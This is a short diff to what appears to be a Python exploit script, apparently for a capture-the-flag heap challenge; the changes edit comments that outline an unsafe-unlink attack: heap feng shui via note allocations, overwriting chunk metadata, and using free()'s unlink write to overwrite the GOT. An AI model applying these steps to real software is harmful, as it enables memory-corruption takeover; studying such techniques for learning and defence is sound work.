@@ -122,7 +122,7 @@ if __name__ == "__main__":
     #
     # Step 1)
     #
-    # building heap feng shui suitable for "unsafe_unlink" technique
+    # heap feng shui suitable for "unsafe_unlink" technique
     #
     new_note('A'*0x100)
     new_note('B'*0x100)
@@ -136,4 +136,12 @@ if __name__ == "__main__":
     # Step 2)
     #
     # land the carefully crafted one big chunk which will overwrite the metadata 
+    #
+
+
+    #
+    # Step 3)
+    # 
+    # free() will do classic 'FD->bk = BK' memory write.
+    # by using this write primitive, we will overwrite GOT
     #
